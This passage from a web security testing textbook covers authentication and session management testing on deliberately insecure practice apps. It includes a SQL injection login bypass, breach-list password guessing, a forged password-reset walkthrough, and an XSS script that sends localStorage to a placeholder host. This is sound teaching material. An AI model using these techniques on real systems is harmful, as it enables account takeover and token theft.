When you find user enumeration, it is best to follow up by compromising an account when that is in scope. There are breach lists and databases where you can find passwords associated with a given email address or username. Check out Scylla and haveibeenpwned to get copies of breach lists. Then, if you enumerate these users, you can try the passwords already related to them. There are also many popular password lists. Burpsuite has a built-in password list, and the rockyou.txt list, though quite large, is still considered very good. The rockyou.txt list, which is automatically included in Kali Linux, is from a data breach in 2009 from Rock You Inc., where all passwords were exposed and found to be stored in plain text. In Kali Linux cd /usr/share/wordlists, look for rockyou.txt.gz. It has 14 million passwords and is zipped using the gzip utility. You will have to extract it using sudo gzip -d /usr/share/wordlists/rockyou.txt.gz.

User enumeration is not a serious issue when the application requires VPN access. In this case, the impact of user enumeration is minimal and should be reported as an informational vulnerability. Furthermore, if the application enforces multi-factor authentication, user enumeration only poses an informational risk unless additional problems allow the attacker to bypass multi-factor authentication.

[Testing methodology](#contents.xhtml_sc3_135a)

Testing for username enumeration involves checking the registration, login, and forgotten password pages for differences that indicate valid usernames. If any other spots allow username enumeration that does not require being logged in, then include those other areas of the website as well. Testing is straightforward. On login pages, try an existing account with an incorrect password, then compare it to what happens when you try a nonexistent username. On the forgot password and registration pages, try them with existing and non-existing usernames and compare what happens. If you can distinguish the two in any way, you have username enumeration and can use brute-force techniques to discover more. Different ways to differentiate between the two are different behaviors, such as being redirected to a different URL or getting another HTTP response code, different messages in the HTTP response body, or significantly different response times.

Let us walk through a simple example using the habit helper application’s forgotten password page. First, browse the forgot password page and enter a known username, such as the site founder, Lizzie. See the following figure with a message saying an email has been sent:

![](images/Figure_9.12.png)

Figure 9.12: Checking for user enumeration with an existing username

Now, let us try a non-existent username. Then, we received the following message saying that the username has not registered an account yet:

![](images/Figure_9.13.png)

Figure 9.13: Checking username enumeration with nonexistent username

This is a simple example where the HTTP response messages differ. Other methods may require checking in Burpsuite for timing differences and HTTP headers.

[Secure design and coding for username enumeration](#contents.xhtml_sc3_136a)

Addressing username enumeration vulnerabilities requires strategic adjustments to login, forgot password, and registration pages. For login and forgot password functionalities, refrain from solely requesting the username. Instead, ask for multiple pieces of information and supply a generic error message if the data does not match, preventing attackers from discerning valid usernames through varied responses.

In registration, if unrestricted username choice is allowed, notifying users about username availability can inadvertently help enumeration. To counter this, opt for validated email addresses as usernames. This solution enhances security by avoiding username disclosure and streamlines the registration process, contributing to a more resilient authentication system overall.

[Registration vulnerabilities](#contents.xhtml_sc2_137a)

Various risks threaten the integrity of the user registration processes. This section will explore issues such as registration username enumeration, the peril of registering existing usernames, potential hazards associated with registering unique usernames like "root" or “..” and exploiting mass assignment vulnerabilities. Uncovering and addressing these vulnerabilities are vital in fortifying registration mechanisms against misuse and unauthorized access.

[Testing procedures](#contents.xhtml_sc3_138a)

The first step in testing registration is registering a user to get a baseline request. This was probably done during your mapping phase. Some tests to run on the registration process include:

*   After registering a user, try registering the same user again with a different password. If the system lets you register this user twice, log in and see which password works. If both work, then you must thoroughly test to see if the two users are separated or if there are authorization issues. Determine what happens if you change both passwords to match. Figure out which user you will have access.
*   Check if user enumeration is possible on the registration page. This is often the case if users can pick any username they like.
*   Check if you can register special usernames like: “sa”, “root”, “su”, “admin”, “.”, or “..”. If so, test the application thoroughly as that user to verify the username does not affect the application behavior. Note “..” could change directories you read/write to if files are read and written. You may see file not found errors that do not happen on a different user.
*   Check if you can bypass any password complexity requirements.
*   Check for injection vulnerabilities, such as SQL injection in the registration page.
*   If the registration page is a sequential process flow, which often happens if email or mobile phone number verification is part of the process, then test the sequential process flow.
*   Try usernames that are cross-site scripting or other injection attacks like xml injection or command injection, and if they are allowed, test that application thoroughly with that user to verify they do not change the behavior.

| Note: Permitting a username of <script>alert(1)</script> is not a vulnerability and may be desired behavior. This would only become a vulnerability if the cross-site scripting is executed. |

*   Check if the registration backend process has a mass assignment vulnerability. These will be covered in the following subsection.

[Mass assignment vulnerabilities](#contents.xhtml_sc3_139a)

When referring to mass assignment vulnerabilities, the focus is on the misuse of software frameworks that allow the automatic binding of HTTP request parameters into program code variables or objects. Mass assignment is also sometimes referred to as object injection or autobinding. This subsection will explore the inherent risks associated with this feature, exploring scenarios where attackers could exploit the automatic assignment of parameters to manipulate program variables, potentially leading to unauthorized access or unintended modifications. Understanding and mitigating mass assignment vulnerabilities is crucial for keeping the security and integrity of web applications. The following is a simple example of what this attack looks like. Consider the following HTML form:

<form>

<input name="userid" type="text">

<input name="passwd" type="text">

<input name="email" text="text">

<input type="submit">

</form>

The following class encapsulates this data:

public class User {

private String userid;

private String passwd;

private String email;

private boolean isAdmin;

//Getters & Setters

}

@RequestMapping(value = "/addMyUser", method = RequestMethod.POST)

public String submit(User user) {

userService.add(user);

return "successPage";

}

Then, the HTTP request submitted with the form would look like the following:

POST /addMyUser

...

userid=test1234&passwd=mtpass&email=test@test.com

The mass assignment vulnerability would happen if the attacker could guess or figure out the name of sensitive fields and change the request to become the following:

POST /addMyUser

...

userid=test1234&passwd=mtpass&email=test@test.com&isAdmin=true

This could also occur if the attacker has access to the source code.

[Registration testing example](#contents.xhtml_sc3_140a)

This section will walk through a registration test on the habit-helper application. Let us test what happens when we try to register the same username twice. Start by registering a new user and logging in to verify the validity. In this example, we will register the user PumpkinTheif with the password PumpkinTheif1234, as follows:

![](images/Figure_9.14.png)

Figure 9.14: Register PumpkinThief

Now, log in as this user to verify the registration was successful. The account update page is follows:

![](images/Figure_9.15.png)

Figure 9.15: PumpkinThief is logged in

Now, log out and try registering this user again. We use a different password, habit, and David Bowie song this time:

![](images/Figure_9.16.png)

Figure 9.16: Register PumpkinThief a second time

The registration returns with a message that it is successful, as follows:

![](images/Figure_9.17.png)

Figure 9.17: Registration successful

Now, try to log in with both passwords and see what happens. Logging in with either password gets the same error message as follows:

![](images/Figure_9.18.png)

Figure 9.18: Cannot log in if user registered twice

Effectively, registering a user a second time on this application caused a denial of service. The exact reason is buried in the source code.

[Secure coding advice for registration](#contents.xhtml_sc3_141a)

This subsection helps you code and design registration correctly. Refer to [Chapter 4](#ch04.xhtml), Observability with SQL Injections, for details if injection attacks, such as SQL injection or XSS are possible through registration. If there is a client-side bypass for password complexity, please refer to [Chapter 6](#ch06.xhtml), CORs Exploitation. If there is a sequential process flow issue or the same user can be registered twice, refer to [Chapter 8](#ch08.xhtml), Executing Business Logic Vulnerabilities, for business logic issues. Refer to the subsection on Username enumeration for remediation advice if it is possible during registration.

Please use a denylist to disallow any special usernames that cause different behavior for the web application, such as root or “..”.

There are three methods to fix mass assignment vulnerabilities. We can use a data transfer object, architectural solution, allowlist, or denylist. Using a data transfer object would involve creating an intermediary class that only has the fields set by the web application, such as the one given below:

public class UserRegistrationFormDTO {

private String userid;

private String passwd;

private String email;

//NOTE: isAdmin field is not present

//Getters & Setters

}

If this class was used, it would be impossible to set the isAdmin field, and it could have a function to create the alternate User class.

The following function would be used to use an allowlist with Spring MVC:

@Controller

public class UserController

{

@InitBinder

public void initBinder(WebDataBinder binder, WebRequest request) {

binder.setAllowedFields(["userid","passwd","email"]);

}

...

}

A denylist would be done somewhat similarly in Spring MVC. See the following code sample:

@Controller

public class UserController

{

@InitBinder

public void initBinder(WebDataBinder binder, WebRequest request)

{

binder.setDisallowedFields(["isAdmin"]);

}

...

}

[Login vulnerabilities](#contents.xhtml_sc2_142a)

Securing the login functionality of web applications is paramount in safeguarding sensitive user information and preventing unauthorized access. This section delves into the spectrum of login-related vulnerabilities, ranging from foundational principles of login security to intricate threats such as username enumeration, brute force dictionary attacks, and sophisticated techniques employed by attackers to bypass login mechanisms. Understanding these vulnerabilities is crucial for fortifying authentication processes and ensuring the robust defense of user accounts against various cyber threats.

[Testing procedures](#contents.xhtml_sc3_143a)

The first step in testing login is to login as a user to get a baseline request. This was probably done during your mapping phase. Some tests to run on the login process include:

*   Login with an incorrect password to verify that no access is granted.
*   Try to bypass login via manually browsing to the next page or SQL injection.
*   Check if user enumeration is possible from the login page.
*   Check if you can perform a brute force attack to guess passwords via a dictionary attack.
*   Verify Login always occurs via an encrypted channel.

[Login bypass via SQL injection](#contents.xhtml_sc3_144a)

This section discusses bypassing login via SQL injection on the amazing-myths-3 application. First, browse to the login page amazing-myths-3, then try to login with the username of ‘, and password of MyPassword1234. See the following figues, which show submitting this and getting an error:

![](images/Figure_9.19.png)

Figure 9.19: Testing for SQL injection in Username field

Next, look at the error message that occurs when this is submitted:

![](images/Figure_9.20.png)

Figure 9.20: SQL error message from login screen

We can use this error message to craft our SQL to bypass login. Also, note that the given SQL shows that the password is stored in plaintext. We know this because the password is compared to the plaintext password we entered. Stay alert for clues to additional vulnerabilities in error message like this one. Passwords should be hashed using a strong one-way algorithm such as bcrypt or SHA-512.

If we want to bypass the password check, we can add an or with an always true condition and then a comment. One example of this is ‘ or 1=1 --. Let us try this value and see what happens:

![](images/Figure_9.21.png)

Figure 9.21: Login with SQL injection

After submitting, we will see the following:

![](images/Figure_9.22.png)

Figure 9.22: After bypassing the login

If we browse to update account, we can see that we are logged in as Julia Hull and see her secret question and answer. Refer to the following figure:

![](images/Figure_9.23.png)

Figure 9.23: Logged in as JuliaHull

[Login vulnerability secure coding advice](#contents.xhtml_sc3_145a)

As we fortify the login mechanisms, applying the secure coding principles we have discussed in earlier chapters is essential. Drawing from our insights on injection attacks in [Chapter 4](#ch04.xhtml), Observability with SQL Injections, ensure stringent input validation and parameterized queries to thwart potential exploits. Moreover, integrating user enumeration and brute force attack defenses, as explored earlier in this chapter, adds an extra layer of protection. Implementing account lockouts, throttling, and strong password policies are integral in crafting resilient login systems that guard against cyber threats.

[Logout vulnerabilities](#contents.xhtml_sc2_146a)

Though seemingly straightforward, logout vulnerabilities call for careful consideration in the overall security landscape. While users expect seamless logout functionality, this process's vulnerabilities can compromise the sessions' integrity. Acknowledging the interconnected nature of logout vulnerabilities with session security is essential. This topic will be comprehensively explored in [Chapter 10](#ch10.xhtml): Session Management, emphasizing the holistic approach necessary for safeguarding user sessions and maintaining a robust authentication environment. Additionally, the intricacies of logout in single sign-on scenarios may introduce complexities that demand specialized attention to ensure comprehensive security.

[Chapter 10](#ch10.xhtml),  Session Management, will walk through examples of logout vulnerabilities related to the session.

[Forgot password vulnerabilities](#contents.xhtml_sc2_147a)

Forgotten password mechanisms play a fundamental role in user account recovery, yet they pose distinct vulnerabilities that demand scrutiny. This section explores the intricacies of forgotten password vulnerabilities, ranging from the risk of username enumeration to potential exploits such as bypassing verification checks, manipulating side channels, exploiting guessable one-time passwords or tokens, and orchestrating brute-force attacks on these temporary credentials. Understanding and mitigating these vulnerabilities is essential for supporting the resilience of account recovery processes and fortifying the overall security of authentication systems.

[Testing procedures for forgotten password](#contents.xhtml_sc3_148a)

The first step in testing forgottan password procedure is to use the functionality as a user to get a baseline request. This was probably done during your mapping phase. Some tests to run on the login process include:

*   Verify if user enumeration is possible.
*   Verify a side channel is used.
*   Check if you can bypass any verification checks or side channels.
*   Check if one-time passwords or tokens are brute forceable or guessable.
*   Verify that the user cannot be changed after performing verification checks.
*   Verify that you cannot use the forgotten password request to reset the password more than once.

[Forgotten password testing](#contents.xhtml_sc3_149a)

Let us walk through an example of testing the forgotten password implementation in the habit-helper web application.

We will use the grinch username registered earlier for our example. We will walk through three tests.

*   We will verify the use of a side channel.
*   We will see if we can bypass it or change the user. Specifically, we will try to change the user to Lizzie.
*   Lastly, we will verify that the reset password part of the forgotten password flow is valid only once.

First, when prompted, we will go to the forgot password page and enter the username grinch. An email with instructions is sent, and a new NEW EMAIL tab is shown at the top right. Refer to the following figure:

![](images/Figure_9.24.png)

Figure 9.24: NEW EMAIL sent

This insecure application mimics a side channel by creating a modal with the email you would have received. You should never give a real email address when using known insecure applications. This application uses a mock email to side-step the inherent issues of insecure applications while supplying a realistic and easy-to-use user interface.

The email is our side channel. Let us check the email and see if this is a solid implementation or if we can bypass or guess information. The email is as follows:

![](images/Figure_9.25.png)

Figure 9.25: Reset password email

This appears to be a standard email with a link to click to reset your password. Let us copy the link and open it in an incognito browser so that our previous testing does not affect what we see now. The URL is as follows:

![](images/Figure_9.26.png)

Figure 9.26: Reset Password URL

There appear to be two get parameters. One is called resetpassword and the other is called token. It is not clear exactly what either is. Let us go to the URL, open Developer tools, and look:

![](images/Figure_9.27.png)

Figure 9.27: Reset Password next step

A user cookie has the same value as the resetpassword get parameter. The security question is my favorite David Bowie song, so this may be guessable or researchable.

Previously, the token we saw in detail in [Figure 9.26](#ch09.xhtml_fig9-26) ended in an “=”, which generally indicates that it is base64 encoded. So, we can copy the value of the token get parameter, and use the Burp Decoder to see what it stores.

![](images/Figure_9.28.png)

Figure 9.28: Decoded token

This token contains our user’s name and expiration date , as well as a seemingly random value. In [Chapter 10](#ch10.xhtml), we will learn how to check if a seemingly random value is random using Burp’s Sequencer tool.

We could modify this token to be another user’s name, reencode it, replace the cookie, and the get parameter. We could also change the expiration. There is the other User cookie, which contains the value sK291q999985. This is not base64 encoded. If this is checked against the username, we might have a problem, or it may only use this cookie. We could try changing the value of this cookie. It ends in a number, so increasing or decreasing by one would be an interesting test to see if both values matter.

First, verify if the link can be used multiple times. Change the password for grinch and then try to do it a second time.

After changing the grinch’s password, we received the message that the password was updated. Please log in. Refer to the following figure:

![](images/Figure_9.29.png)

Figure 9.29: Password updated

Now, click the NEW EMAIL again and use the link a second time. Upon reusing the link, we see the following error message: the token is either expired or already used. Refer to the following figure:

![](images/Figure_9.30.png)

Figure 9.30: Expired token

Let us generate another forgot password link for grinch. If you generate enough forgot password links, the resetpassword parameter or user parameter will have similarities upon comparing the different versions in each response. If you experiment by moving the number up, eventually, the security questions change. The parameter looks the user up in a database, and the number is related. Specific numbers are invalid, and they vary for each forgotten password link. Refer to the following figures to see how manually changing the get parameter will result in different security questions. The first figure shows the get parameter resetpassword value given by the application.

![](images/Figure_9.31.png)

Figure 9.31: Security question changed with manipulation of resetpassword parameter

Now, the second figure shows the same request except for a manual modification of the resetpassword get parameter. The last character of the get parameter was changed from 0 to 2, and this resulted in a different security question, as shown in the following figure:

![](images/Figure_9.32.png)

Figure 9.32: Security question changing example

Let us make some assumptions and try to guess how this is working:

*   The resetpassword get parameter is used to grab the user data from a database.
*   The final six characters are always numerical and seem to start with three or four 9s.
*   This is the number that increasing will change the security questions.
*   It seems likely that six six-digit number is manipulated somehow to get the database index.
*   The one obvious issue is that the same user generally gets a different 6-digit number. Therefore something else in the string is used in the equation to convert this to a database index. Three other numbers are separated from this number via a few characters. Most likely, these are used somehow. It is unnecessary to waste time figuring out the obscure algorithm. We could figure this out with sufficient examples, but we do not need to, if we can make a few more assumptions.
*   Likely, the first step in the algorithm is to subtract our number from 999999\. Thus, the higher the number, the lower the database index.
*   Lizzie was the founder, so her database index is probably 1, and therefore, the highest number that does not cause an error. We can find the highest number that does not cause an error using brute-force techniques or manually.

To find it manually, try raising the number by 10s until we get an error. When we get an error, try going down five. If that is an error, keep decreasing by one until we find the last valid case. If that is not an error, increment by one until we find the first error, then return to the previous valid point. For example, in the resetpassword link below, we found 999977 was valid, and 999987 was not. So, then we tried 999982, which was valid. Next, we incremented until we find the first non-valid 999985, so we know that Lizzie should be 999984.

So, we take the forgotten password cookie value to the decoder. The value was decoded as base64. We can change the username from grinch to Lizzie. Then, that modified value can be encoded as base64\. This is shown in the following figure:

![](images/Figure_9.33.png)

Figure 9.33: Burp Decoder modify username

We then modified the cookie to the new value, as follows:

![](images/Figure_9.34.png)

Figure 9.34: Update Cookie Cookie

Then, it was a simple task of guessing Lizzie’s favorite David Bowie song. When this is done, we get redirected to the login page with the following message:

![](images/Figure_9.35.png)

Figure 9.35: Successfully modified another user’s password

This was one of the CTF flags for this insecure application. Read on to find out about securing forgotten password pages.

[Secure coding advice for forgotten password](#contents.xhtml_sc3_150a)

Ensuring a robust process for users to reset passwords is paramount for account security. Adopting a multipart approach enhances the resilience of this mechanism. Initially, validating a user's identity by confirming a valid username and other personal information adds an extra layer of verification. Subsequently, generating a secure, one-time password token sent through an out-of-channel method mitigates risks associated with token interception. The token, designed to expire and work only once, is fortified by an added layer of security, requiring users to answer a security question or undergo further verification before going ahead with the password reset.

The order of these steps is contingent on the method employed to distribute the one-time token. Whether delivered as a clickable link in a new browser window or as a manual entry of a numeric/alphanumeric token into the existing session, the security implications differ. Manually entering the token enhances security, reducing susceptibility to threats like hacked emails and phishing attempts. Avoid using java.util.Random for token generation. The deterministic output of Random based on time can be exploited, making java.security.SecureRandom the preferred choice for security-sensitive applications.

[Change password vulnerabilities](#contents.xhtml_sc2_151a)

Addressing vulnerabilities related to changing passwords is pivotal in ensuring the security of user accounts. This section explores effective testing methodologies to uncover potential weaknesses in the password modification process. By verifying the ability to repeat modified requests, checking for bypasses in password complexity requirements, ensuring user consistency in request modifications, and examining the persistence of these modifications after user logout, we aim to fortify the password-changing functionality against a spectrum of security threats.

[Testing procedures for changing passwords](#contents.xhtml_sc3_152a)

The first step in testing changing passwords is to log in as a user and change their password to get a baseline request. This was probably done during your mapping phase. Some tests to run on the change password process include:

*   Check if you can bypass password complexity requirements.
*   Verify if you can change the user on the request.
*   Check if you can repeat the modified request after the user has logged out.

Testing and secure coding advice are similar to other sections. For example, bypassing password complexity is bypassing a client-side control, which was covered, including secure coding advice in [Chapter 6](#ch06.xhtml), CORs Exploitation.

Changing the user on the request would be similar to the forgotten password walkthrough, although this is an authorization issue, and it will be covered in more depth, including appropriate secure coding guidelines in [Chapter 11](#ch11.xhtml), Authorization Practices.

[Conclusion](#contents.xhtml_sc2_153a)

A robust authentication system is foundational for any secure application, and awareness of potential vulnerabilities is crucial for keeping its integrity. In this chapter, we have discussed various authentication attack vectors. We have explored the complex nature of brute force attacks, username enumeration, and vulnerabilities associated with login, logout, forgot password, and change password functionalities. By exploring testing methods and secure coding guidelines, you are now equipped with the knowledge to find and fortify against authentication vulnerabilities.

In the next chapter, you will learn about session management fundamentals. This includes safeguarding against session fixation, guessable session IDs, and session hijacking, as well as the nuances of JWT vulnerabilities.

# [CHAPTER 10Session Management](#contents.xhtml_ch10a)

[Introduction](#contents.xhtml_sc2_154a)

Session management is a crucial aspect of web application security. This chapter explores the specifics of session management testing, including uncovering vulnerabilities that affect cookie-based sessions. We cover everything from the fundamentals to more intricate exploits such as guessable session IDs, session fixation, and session hijacking, providing a thorough analysis. With the help of testing examples and secure coding guidelines, we examine and comprehend well-known attack vectors, enabling you to strengthen your applications against malicious session-based attacks.

[Structure](#contents.xhtml_sc2_155a)

This chapter will discuss the standard session management testing and vulnerabilities, including:

*   Session management testing basics
*   Guessable Session IDs
*   Session fixation
*   Session hijacking
*   JSON Web Tokens

[Objectives](#contents.xhtml_sc2_156a)

At the end of this chapter, you will be familiar with well-known cookie-based session management attack vectors. You will learn how to use Burp Suite’s Sequencer tool to verify whether a session ID is guessable. We will examine in depth session fixation, where the malicious user sets your session token, and session hijacking, where the malicious user steals the user's session token. Finally, we will learn how JSON Web Tokens (JWTs) work to supply sessions to stateless applications. We will look at specific vulnerabilities for JWTs, including Personally identifiable information (PII) leakage, removing integrity checking, and algorithm confusion. Secure coding guidelines will follow.

[Session management basics](#contents.xhtml_sc2_157a)

Session management is an essential aspect of web application security, encompassing the orchestration and control of user interactions during their visit. At its core, a session denotes a historical interaction between a user and the application, started upon login and terminated upon logout. Central to this process are session cookies, unique identifiers that help track and manage user sessions.

Ensuring the security of session management involves using various mechanisms, including specific cookie flags. The Secure cookie flag ensures that the session cookie is transmitted exclusively over secure, encrypted channels, bolstering protection against interception by malicious actors. Meanwhile, the HTTPOnly cookie flag restricts access to the cookie solely to HTTP requests, mitigating the risk of cross-site scripting attacks.

It is crucial to recognize that, from an attacker's perspective, compromising sessions is often more lucrative than targeting credentials directly. Successfully hijacking a session can circumvent multi-factor authentication and IP restrictions, factors typically confirmed only during the login process. Furthermore, security controls like browser validation are generally checked only at the time of login, emphasizing the need for vigilant and robust session management practices throughout the user's interaction with the application.

[Session management basic testing](#contents.xhtml_sc3_158a)

Effective session management hinges on rigorous testing protocols to find and address potential vulnerabilities. In this subsection, we outline key steps to evaluate your session management infrastructure comprehensively:

1. Verify the cookie flags. Confirm the session ID cookie flags adhere to security best practices, specifically having the secure and HTTPOnly flags set to true. Remember, session IDs should never be stored in localStorage or sessionStorage.

2. Test that login creates a new session ID. Log into the application to trigger the generation of a new session ID, confirming the system's ability to securely refresh session tokens.

3. Verify that logout removes the session ID. Logout actions should result in removing the session ID cookie or generating a new session ID.

4. Check that invalidation is done server-side. Ensure that the server invalidates the session, ensuring that the session is no longer valid after logout.

5. Confirm the integrity of session token values. Try to change your session cookie value by trying to use a random token and trying alternatives like dictionary words or non-random strings. More details on this will be included in the Session fixation subsection.

6. Examine the token for its entropy or how guessable it is. Conduct this test using Burp Sequencer. See the subsection on Guessable Session IDs.

Using these testing guidelines empowers you to assess and fortify your session management systematically, minimizing the risk of potential exploits and enhancing overall security.

[Secure coding guidelines](#contents.xhtml_sc3_159a)

Establishing a robust foundation for secure session management is pivotal in safeguarding user interactions. After a successful login, transitioning from non-SSL to SSL, or a role change, a new session should be generated, and the old one invalidated, which can be done with the following code snippet. Use session.invalidate() followed by session=request.getSession(true) to ensure a fresh session context. Similarly, after a logout action, invoke session.invalidate() to terminate the session gracefully.

Choose built-in session management frameworks such as J2EE for their proven security mechanisms. Ensure that session cookies are configured as HttpOnly and Secure, mitigating the risk of client-side script access and enforcing secure transmission over HTTPS. Crucially, resist the temptation to embed session IDs in URLs, a practice prone to security vulnerabilities. Logging session IDs should be strictly prohibited to prevent accidental exposure. If you must log a session ID, you can truncate the session ID, including up to six characters, to help follow a session in the logs, but other identifiers may better serve you.

Finally, adopting a policy of truncating unnecessary session data reinforces security hygiene. By adhering to these foundational principles, you set up a resilient session management infrastructure that forms the bedrock of a secure web application.

[Guessable session IDs](#contents.xhtml_sc2_160a)

Guessable session ID vulnerabilities introduce the risk of unauthorized access and session hijacking. Session IDs serve as unique tokens to recognize user sessions and become susceptible when they follow predictable or sequential patterns. An attacker armed with the ability to predict or guess session IDs can compromise user sessions, gain unauthorized entry, and potentially exploit sensitive data. Robust session management should include measures to ensure the unpredictability and complexity of session IDs, preventing attempts at unauthorized access and fortifying the application's overall security posture.

[Using Burp Suite Sequencer to test session IDs](#contents.xhtml_sc3_161a)

Burp Suite’s Sequencer tool can be used to check the randomness of anything returned via an HTTP request, not just session IDs. You can use this technique for session IDs or any other token to test the randomness.

Let us test the username cookie in the habit-helper application. Before you start testing the cookie, you must know what request causes the Set-Cookie header in the response. Sometimes, you may already know what request you want to test, but if you do not, then use the Burp Suite search feature to find the right request and response pair. The Search feature is accessed by clicking on Burp and selecting Search from the menu, as shown below:

![](images/Figure_10.1.png)

Figure 10.1: Burp Search functionality

When the new window appears:

1.  We put our search term in the Search textbox. In this case, we will search for Set-Cookie: user=.
2.  We can further refine our search by checking only the response headers under Locations. This will speed up our search and possibly eliminate non-relevant results.
3.  Click the Go button. The search results will return.
4.  Find a request and response pair from the pertinent web application that sets this cookie to a value. See the example below which illustrates these steps:

![](images/Figure_10.2.png)

Figure 10.2: Using Burp Search to find request response pairs

Now, we know a login request that uses a username and password will set this cookie, so we will use the request/response pair to test the randomness. Follow the given steps:

1.  From the Proxy tab, set intercept to on in Burp Suite. This has been covered several times. Refer to [Chapter 3](#ch03.xhtml),  Hands-on with Web Proxies, if you need a refresher.
2.  Log in on the web application with the correct username and password combination. The request will be intercepted.
3.  Right-click on the intercepted request, and when a submenu appears, select Send to Sequencer, as shown follows:

    ![](images/Figure_10.3.png)

    Figure 10.3: Sending request to sequencer tool

4.  Go to the Sequencer tab in Burp Suite, and then in the Token Location Within Response section, select the correct cookie from the dropdown as shown in the following example:

    ![](images/Figure_10.4.png)

    Figure 10.4: Select the cookie to test randomness

5.  Click the start Live capture button. This will pop up a new window showing the capture of tokens. Refer to the following figure:

    ![](images/Figure_10.5.png)

    Figure 10.5: Sequencer pop-up

    If the auto-analyze checkbox is checked, then as the Sequencer gathers tokens, it will auto-analyze and update the information as it runs.

    When finished, there is a lot of information you can look at. The most important part is the summary, which tells you the entropy. Refer to the following figure:

    ![](images/Figure_10.6.png)

    Figure 10.6: Entropy summary in Burp Suite

If it says the entropy is poor, the token you tested is guessable or brute forceable. The other tabs can show some interesting information. In this case, the character level analysis is very interesting. The bit-level analysis includes the Federal Information Processing Standards (FIPS) tests that may be important for your application, depending on the required compliance or controls. FIPS is a set of standards developed by the United States federal government for the processing, storing, and transmitting of sensitive information. These standards are critical in ensuring the security and reliability of information systems within government agencies and organizations that handle sensitive data.

Click on the Character-level analysis tab to look at a summary of character information, as follows:

![](images/Figure_10.7.png)

Figure 10.7: Character-level Summary -nformation

A brief analysis of the character level shows that certain character positions have almost no entropy. The Character set tab indicates the number of characters used in each place. Refer to the following figure:

![](images/Figure_10.8.png)

Figure 10.8: Character set analysis

We can see that certain character positions (6,7,8 and 9) always have the same value, and others have minimal character sets of less than ten options. This makes the cookie guessable, as already proven in [Chapter 9](#ch09.xhtml), Authentication Protocols.

When the randomness is good, the results would look like the following:

![](images/Figure_10.9.png)

Figure 10.9: An example of good randomness

As an exercise, you can reproduce this example by testing the JSESSIONID cookie in the amazing-myths-1 application.

[Session fixation](#contents.xhtml_sc2_162a)

Session fixation is a tactic where an attacker sets or fixates a user's session ID to a known value. This insidious maneuver allows the attacker to arrange a session and potentially gain unauthorized access once the victim logs in. By coercing the victim to use a pre-determined session ID, often achieved through techniques like phishing or malicious links, the attacker can exploit the established session, leading to unauthorized actions and potential compromise of sensitive information. Vigilant session management practices, including periodic session ID regeneration and validation mechanisms, are crucial to stopping session fixation efforts and fortifying the resilience of web applications against such exploits.

[Testing procedures](#contents.xhtml_sc3_163a)

The first step is to see where the session ID gets set. Determine when the session cookie gets set. Check if the session ID ever gets put in the URL. Verify if the session ID is in localStorage or sessionStorage. Then, to test it, try different strings in these spots.

*   Manually update the URL if it is in the URL.
*   If the session gets created as a new cookie, intercept the response using Burp Suite and change the set-cookie header to your value.
*   If the session ID appears to be stored in localStorage or sessionStorage, check the client-side code to see if that is written from the cookie or to the cookie. If so, you may try changing those values.

Remember, just because NotRandom is not acceptable does not mean there is no session fixation. You may need to use a proper character set only or a certain length, etc.

Let us test Amazing-Myths-3 for session fixation. The session is set in a cookie, and we will use BurpSuite to change the Set-Cookie value. This is slightly different than just altering the cookie value using developer tools. Depending on the code, it may be that any change after the set cookie logs you off, and any change before is overwritten. It seems complicated to exploit session fixation in this case, but it is still a vulnerability if the session value can be changed to something non-random. However, the chances of exploiting it are low if there is no obvious way to get a user to use our value. This will affect severity scoring in a penetration test write-up.

Now, let us walk through the session fixation steps.

1. Find the request that causes a Set-Cookie request for the JSESSIONID. This can be done using the Search feature shown in the previous section.

2. After finding the request and response, it seems to happen only the first time we request a page. Open a new incognito browser to request the page.

3. Turn the intercept on in Burp Suite. This is done on the Proxy tab; if you need a reminder, see [Chapter 3](#ch03.xhtml), Hands On With Web Proxies.

4. Go to the Options tab under the Proxy. Refer to the following figure:

![](images/Figure_10.10.png)

Figure 10.10: Burp Suite Proxt Options for Interception of responses

5. Scroll down to the Intercept Server Responses  section. Put a checkmark in the box next to Intercept responses based on the following rules.

6. Verify that the 3rd default rule is checked. This rule will intercept responses where the request was also intercepted.

7. Now, enter the URL in the incognito browser. This will be intercepted.

8. Click Forward to send the request seen in the Proxy tab, as follows:

![](images/Figure_10.11.png)

Figure 10.11: Forward request through a proxy

9. Depending on whether you entered the trailing slash / you may have to forward a 302 response and another Get request before the desired response of 200 OK with the Set-Cookie is intercepted.

10. After intercepting the response, change the cookie value in the Set-Cookie header as follows:

![](images/Figure_10.12.png)

Figure 10.12: Using Burp Suite to change a cookie value via response interception

11. Click the Forward button and turn Intercept off.

12. Go to the Developer tools and check your cookie value. At first glance, it appears to have accepted our modified value. However, this is not surprising since we manually set it in the response. Now, we have to determine if we can use this cookie in future requests. Refer to the following figure:

![](images/Figure_10.13.png)

Figure 10.13: Modified session cookie

13. Let us browse to a different page to see if the application will continue to let us use our cookie. Browsing the about-us page, which is public, causes our cookie to be changed, as shown below:

![](images/Figure_10.14.png)

Figure 10.14: Session Cookie modified with any browsing

Thus, this application is not vulnerable to session fixation.

[Session hijacking](#contents.xhtml_sc2_164a)

Session hijacking is when an attacker illicitly gets and takes control of an active user's session. This unauthorized access enables the attacker to impersonate the legitimate user, potentially leading to unauthorized actions and data exposure. Session hijacking can occur through various means, including the interception of session cookies, exploitation of session vulnerabilities, or malware. The consequences of successful session hijacking can be severe, ranging from unauthorized access to sensitive information to potentially manipulating user accounts. Robust security measures, such as encryption, secure session management practices, and continuous monitoring, are imperative to mitigate the risks associated with session hijacking and safeguard the integrity of user sessions.

[Exploiting session hijacking](#contents.xhtml_sc3_165a)

Session hijacking is generally done via stealing, guessing, or using the victim's session cookie and then changing your cookie to that value. A few factors to watch out for: the session is not always stored in a cookie; it could be in the URL, localStorage, sessionStorage, or even an HTTP header. The session ID could be called something different, as the name is arbitrary. There may be more than one session involved in an application.

In this example, using the habit-helper application, we will perform a session hijacking attack via the remember me feature. When the user logs in with the remember me box checked, a new seemingly random token is generated that acts as a session token for one thing, using the remember me feature. Refer to the following figure:

![](images/Figure_10.15.png)

Figure 10.15: Remember me HTTP request and response

Further digging into the application shows that this is stored in the Local Storage, as follows:

![](images/Figure_10.16.png)

Figure 10.16: Remember the token in Local Storage

Let us create a cross-site scripting attack to steal all the localStorage. Building upon our learnings in [Chapter 6](#ch06.xhtml), CORs Exploitation, our cross-site scripting attack should be as follows:

<script>

var img = new Image();

store = "";

for (let i = 0; i < localStorage.length; i++) {

const key = localStorage.key(i);

const value = localStorage.getItem(key);

store += value + "\n";

}

img.src="https://myURL?values=" + store;

</script>

Here, the value for myURL should substitute wherever your webserver stands up.

